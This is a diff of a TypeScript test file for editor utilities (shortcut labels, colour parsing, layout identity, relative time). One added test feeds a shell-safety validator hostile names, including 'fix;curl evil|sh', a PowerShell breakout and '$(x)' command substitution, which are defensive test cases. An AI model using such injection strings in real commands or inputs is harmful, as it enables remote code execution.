@@ -1,22 +1,33 @@
 import { expect, test } from "bun:test";
 import {
+	compactAge,
 	cssColorToHex,
 	hasPlatformModifier,
 	isAbsolutePath,
-	isMarkdownPath,
+	isShellInert,
 	layoutResourceIdentity,
 	normalizePath,
 	parseTupleKey,
+	platformFamily,
 	platformShortcutLabel,
 	projectRelativePath,
+	relativeTime,
 	shallowEqualArrays,
 	stripFrontmatter,
 	tupleKey,
 } from "./utils";
 
+test("platformFamily classifies the browser-reported platform", () => {
+	expect(platformFamily("MacIntel")).toBe("apple");
+	expect(platformFamily("Win32")).toBe("windows");
+	expect(platformFamily("Linux x86_64")).toBe("linux");
+	expect(platformFamily("")).toBe("other");
+});
+
 test("platform shortcuts use Ctrl on non-Apple platforms", () => {
 	const platform = "Linux x86_64";
-	expect(platformShortcutLabel("B", platform)).toBe("Ctrl+B");
+	expect(platformShortcutLabel("B", { platform })).toBe("Ctrl+B");
+	expect(platformShortcutLabel("N", { platform, alt: true })).toBe("Ctrl+Alt+N");
 	expect(hasPlatformModifier({ ctrlKey: true, metaKey: false }, platform)).toBe(true);
 	expect(hasPlatformModifier({ ctrlKey: false, metaKey: true }, platform)).toBe(false);
 	expect(hasPlatformModifier({ ctrlKey: true, metaKey: true }, platform)).toBe(false);
@@ -24,20 +35,29 @@ test("platform shortcuts use Ctrl on non-Apple platforms", () => {
 
 test("platform shortcuts use Command on Apple platforms", () => {
 	const platform = "MacIntel";
-	expect(platformShortcutLabel("B", platform)).toBe("⌘B");
+	expect(platformShortcutLabel("B", { platform })).toBe("⌘B");
+	expect(platformShortcutLabel("N", { platform, alt: true })).toBe("⌥⌘N");
 	expect(hasPlatformModifier({ ctrlKey: false, metaKey: true }, platform)).toBe(true);
 	expect(hasPlatformModifier({ ctrlKey: true, metaKey: false }, platform)).toBe(false);
 	expect(hasPlatformModifier({ ctrlKey: true, metaKey: true }, platform)).toBe(false);
 });
 
-test("isMarkdownPath matches .md/.markdown case-insensitively, nothing else", () => {
-	expect(isMarkdownPath("README.md")).toBe(true);
-	expect(isMarkdownPath("docs/GUIDE.MARKDOWN")).toBe(true);
-	expect(isMarkdownPath("a/b/notes.Md")).toBe(true);
-	expect(isMarkdownPath("index.ts")).toBe(false);
-	expect(isMarkdownPath("notes.txt")).toBe(false);
-	expect(isMarkdownPath("mdfile")).toBe(false);
-	expect(isMarkdownPath("weird.md.ts")).toBe(false);
+test("isShellInert accepts only names that stay literal in POSIX, PowerShell, and cmd", () => {
+	expect(isShellInert("olga/plan-page")).toBe(true);
+	expect(isShellInert("release-1.2_rc")).toBe(true);
+	for (const hostile of [
+		"",
+		"-x",
+		"fix;curl evil|sh",
+		"a';Write-Output PWNED;#",
+		"a&b",
+		"$(x)",
+		"a`b",
+		"a%b%",
+		"a b",
+	]) {
+		expect(isShellInert(hostile)).toBe(false);
+	}
 });
 
 test("stripFrontmatter drops a leading YAML block, keeping the body", () => {
@@ -62,6 +82,11 @@ test("cssColorToHex expands short hex and passes full hex through", () => {
 	expect(cssColorToHex("#ffffff")).toBe("#ffffff");
 	expect(cssColorToHex("#a9b7c6")).toBe("#a9b7c6");
 	expect(cssColorToHex(" #2b2b2b ")).toBe("#2b2b2b");
+});
+
+test("cssColorToHex canonicalizes serialized sRGB colors", () => {
+	expect(cssColorToHex("color(srgb 1 0.5 0 / 20%)")).toBe("#ff800033");
+	expect(cssColorToHex("color(srgb 0.2 0.4 0.6)")).toBe("#336699");
 });
 
 test("cssColorToHex reads unparseable values as unset", () => {
@@ -97,6 +122,40 @@ test("layout resource identity ignores placement ids and separates delimiter-bea
 			name: "Two",
 			path: "a:commit:x",
 			scope: { kind: "commit", sha: "y" },
+		}),
+	);
+});
+
+test("a changes review tab is identified by its scope alone, apart from any file diff", () => {
+	const branch = layoutResourceIdentity({
+		kind: "changes",
+		id: "one",
+		name: "Changes",
+		scope: { kind: "branch" },
+	});
+	expect(branch).toBe(
+		layoutResourceIdentity({
+			kind: "changes",
+			id: "two",
+			name: "Other",
+			scope: { kind: "branch" },
+		}),
+	);
+	expect(branch).not.toBe(
+		layoutResourceIdentity({
+			kind: "changes",
+			id: "one",
+			name: "Changes",
+			scope: { kind: "commit", sha: "abc" },
+		}),
+	);
+	expect(branch).not.toBe(
+		layoutResourceIdentity({
+			kind: "diff",
+			id: "one",
+			name: "a",
+			path: "a",
+			scope: { kind: "branch" },
 		}),
 	);
 });
@@ -150,4 +209,17 @@ test("shallowEqualArrays compares element-wise and treats absent as unequal", ()
 	expect(shallowEqualArrays([Number.NaN], [Number.NaN])).toBe(true);
 	expect(shallowEqualArrays(undefined, [])).toBe(false);
 	expect(shallowEqualArrays(undefined, undefined)).toBe(true);
+});
+
+test("relativeTime measures against the given now, not the clock", () => {
+	const now = 1_000_000_000_000;
+	expect(relativeTime(now - 59_000, now)).toBe("just now");
+	expect(relativeTime(now - 5 * 60_000, now)).toBe("5m ago");
+	expect(relativeTime(now - 3 * 3_600_000, now)).toBe("3h ago");
+	expect(relativeTime(now - 2 * 86_400_000, now)).toBe("2d ago");
+	expect(compactAge(now - 20 * 60_000, now)).toBe("<1h");
+	expect(compactAge(now - 5 * 3_600_000, now)).toBe("5h");
+	expect(compactAge(now - 13 * 86_400_000, now)).toBe("13d");
+	expect(compactAge(now - 20 * 86_400_000, now)).toBe("2w");
+	expect(compactAge(now - 100 * 86_400_000, now)).toBe("3mo");
 });
